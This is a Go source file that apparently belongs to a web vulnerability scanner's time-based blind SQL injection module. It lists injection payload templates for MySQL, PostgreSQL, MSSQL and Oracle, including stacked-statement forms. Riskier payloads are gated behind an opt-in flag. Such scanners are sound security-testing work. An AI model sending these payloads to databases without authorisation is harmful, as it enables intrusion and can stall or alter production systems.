package sqli_time_blind

import (
	"fmt"

	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
)

// prioritizeByDBMS reorders payloads so those matching a DBMS already
// identified for this host (e.g. by the error-based module, recorded in the
// TechRegistry) are tried first. Combined with early-exit on the first
// confirmed pair this cuts requests sharply when the backend is known, without
// dropping coverage if the hint turns out to be wrong.
func prioritizeByDBMS(payloads []timePair, scanCtx *modkit.ScanContext, host string) []timePair {
	if scanCtx == nil || scanCtx.TechStack == nil {
		return payloads
	}
	known := map[string]bool{}
	for _, t := range []string{"mysql", "postgres", "mssql", "oracle"} {
		if scanCtx.TechStack.Has(host, infra.DBMSTechTag(t)) {
			known[t] = true
		}
	}
	if len(known) == 0 {
		return payloads
	}
	first := make([]timePair, 0, len(payloads))
	rest := make([]timePair, 0, len(payloads))
	for _, p := range payloads {
		if known[p.dbType] {
			first = append(first, p)
		} else {
			rest = append(rest, p)
		}
	}
	return append(first, rest...)
}

// riskLevel classifies how much collateral a time payload can cause beyond the
// delay it measures.
type riskLevel int

const (
	// riskNormal payloads evaluate the delay once per query (AND-guarded, or a
	// scalar comparison), so the cost is the requested sleep and nothing else.
	riskNormal riskLevel = iota
	// riskHigh payloads are gated below --intensity deep unless the operator
	// opts in with --allow-risky-payloads (modkit.ScanContext.RiskyPayloadsAllowed):
	//   - OR-per-row forms (' OR SLEEP, ' OR 1=DBMS_PIPE…) run the delay once
	//     per scanned row, which can multiply the sleep, hold row locks, and
	//     tie up a connection-pool slot far longer than the probe intends;
	//   - stacked forms ('; WAITFOR, '; SELECT pg_sleep…) append a statement
	//     and, when the injection point sits in an UPDATE/DELETE, run after a
	//     write the scanner did not mean to make.
	riskHigh
)

// timePair is a parametric time-based blind SQLi payload. The template carries a
// %d placeholder for the sleep seconds so the scanner can request different
// durations and verify the observed delay scales with the requested value —
// the core false-positive defense. Only backends whose delay scales with a
// numeric argument are included (MySQL SLEEP, PostgreSQL pg_sleep, MSSQL
// WAITFOR, Oracle DBMS_PIPE); SQLite's RANDOMBLOB delay is not expressible in
// seconds and cannot be scale-verified, so it is intentionally omitted here and
// left to the error-based / boolean-blind modules.
type timePair struct {
	context  string    // "string", "numeric"
	dbType   string    // "mysql", "postgres", "mssql", "oracle"
	template string    // %d = sleep seconds
	risk     riskLevel // riskHigh = deep or --allow-risky-payloads only
}

// render returns the payload fragment for the given sleep duration in seconds.
// seconds==0 yields the no-delay variant.
func (p timePair) render(seconds int) string {
	return fmt.Sprintf(p.template, seconds)
}

// stringPayloads are payloads for string context injection points.
//
// MSSQL has no non-stacked WAITFOR form (WAITFOR is a statement, not an
// expression), so MSSQL time-blind is deep / --allow-risky-payloads only. The
// PostgreSQL ::text OR form stays normal risk: pg_sleep sits in a scalar
// subquery that the planner evaluates once, not per row.
//
// MySQL reads "--" as a comment only when followed by whitespace, so every
// MySQL comment-terminated form ends "-- -" (the trailing "-" keeps the space
// from being trimmed). Each backend also has a form that needs no comment at
// all — the injection closes into the original query's trailing quote
// (' AND SLEEP(n) AND '1'='1) or concatenates into the string ('||…||') — for
// sinks that append text after the parameter.
var stringPayloads = []timePair{
	{context: "string", dbType: "mysql", template: "' OR SLEEP(%d)-- -", risk: riskHigh},
	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d)-- -"},
	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d) AND '1'='1"},
	{context: "string", dbType: "postgres", template: "'; SELECT pg_sleep(%d)--", risk: riskHigh},
	{context: "string", dbType: "postgres", template: "' OR (SELECT pg_sleep(%d))::text='1'--"},
	{context: "string", dbType: "postgres", template: "'||(SELECT '' FROM pg_sleep(%d))||'"},
	{context: "string", dbType: "mssql", template: "'; WAITFOR DELAY '0:0:%d'--", risk: riskHigh},
	{context: "string", dbType: "mssql", template: "' OR 1=1; WAITFOR DELAY '0:0:%d'--", risk: riskHigh},
	{context: "string", dbType: "oracle", template: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--", risk: riskHigh},
	// AND-guarded: the delay runs once per matching row like the MySQL AND form.
	{context: "string", dbType: "oracle", template: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)-- -"},
}

// numericPayloads are payloads for numeric context injection points.
var numericPayloads = []timePair{
	{context: "numeric", dbType: "mysql", template: " OR SLEEP(%d)-- -", risk: riskHigh},
	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)-- -"},
	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)"},
	{context: "numeric", dbType: "postgres", template: "; SELECT pg_sleep(%d)--", risk: riskHigh},
	{context: "numeric", dbType: "postgres", template: " AND 1=(SELECT 1 FROM pg_sleep(%d))"},
	{context: "numeric", dbType: "mssql", template: "; WAITFOR DELAY '0:0:%d'--", risk: riskHigh},
	{context: "numeric", dbType: "oracle", template: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--", risk: riskHigh},
}

// getPayloadsForValue selects appropriate payloads based on the parameter's
// base value. Unless allowRisky is set (deep, or --allow-risky-payloads), the
// riskHigh templates are dropped.
func getPayloadsForValue(baseValue string, allowRisky bool) []timePair {
	all := stringPayloads
	if infra.IsNumericValue(baseValue) {
		all = numericPayloads
	}
	if allowRisky {
		return all
	}
	safe := make([]timePair, 0, len(all))
	for _, p := range all {
		if p.risk != riskHigh {
			safe = append(safe, p)
		}
	}
	return safe
}
